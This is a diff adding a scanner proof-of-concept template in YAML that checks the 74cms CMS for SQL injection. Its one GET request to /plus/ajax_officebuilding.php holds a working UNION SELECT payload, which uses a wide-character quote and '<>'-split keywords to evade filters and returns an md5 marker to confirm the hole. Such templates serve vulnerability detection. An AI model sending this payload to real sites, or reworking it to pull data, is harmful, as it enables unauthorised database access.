@@ -1,0 +1,22 @@
+id: poc-yaml-74cms-sqli-2
+info:
+  name: 74cms 2 SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 74cms
+  reference: []
+  description: null
+variables:
+  rand: random_int(10000, 21000)
+transport: http
+requests:
+- method: GET
+  path: /plus/ajax_officebuilding.php?act=key&key=錦%27%20a<>nd%201=2%20un<>ion%20sel<>ect%201,2,3,md5({{.rand}}),5,6,7,8,9%23
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: contains(body, md5(rand))
+  output: []
